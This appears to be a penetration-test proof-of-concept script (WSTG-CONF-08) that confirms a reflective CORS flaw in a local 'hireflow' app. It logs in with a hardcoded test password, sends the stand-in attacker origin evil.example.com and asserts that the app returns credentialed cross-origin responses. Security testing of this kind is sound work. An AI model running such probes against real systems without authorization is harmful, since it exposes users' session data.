"""
WSTG-CONF-08: Reflective CORS allows credentialed cross-origin reads.

Demonstrates that the API reflects an arbitrary Origin and allows credentials on
an authenticated endpoint. In a browser, this enables a malicious origin to read
the victim's API response when the victim has an active session cookie.

Expected:
- Login succeeds and issues a session cookie
- GET /api/auth/me with Origin: https://evil.example.com returns 200
- Response includes:
  Access-Control-Allow-Origin: https://evil.example.com
  Access-Control-Allow-Credentials: true
"""

from __future__ import annotations

import requests


BASE = "http://localhost:3000"
PASSWORD = "password123"
EVIL_ORIGIN = "https://evil.example.com"


def main() -> None:
    sess = requests.Session()

    login = sess.post(
        f"{BASE}/api/auth/login",
        json={"email": "testclient@hireflow.com", "password": PASSWORD},
        timeout=10,
    )
    login.raise_for_status()
    print("[+] Logged in as testclient@hireflow.com")
    print(f"[+] Session cookies: {sess.cookies.get_dict()}")

    me = sess.get(
        f"{BASE}/api/auth/me",
        headers={"Origin": EVIL_ORIGIN},
        timeout=10,
    )
    me.raise_for_status()

    print(f"[+] Status: {me.status_code}")
    print(f"[+] Access-Control-Allow-Origin: {me.headers.get('Access-Control-Allow-Origin')}")
    print(f"[+] Access-Control-Allow-Credentials: {me.headers.get('Access-Control-Allow-Credentials')}")
    print(f"[+] Response body: {me.json()}")

    assert me.headers.get("Access-Control-Allow-Origin") == EVIL_ORIGIN, "Expected reflected Origin"
    assert me.headers.get("Access-Control-Allow-Credentials") == "true", "Expected credentialed CORS"
    assert me.json()["user"]["email"] == "testclient@hireflow.com", "Expected authenticated user data"

    print("\n[VULNERABLE] Credentialed cross-origin API reads are allowed")


if __name__ == "__main__":
    main()
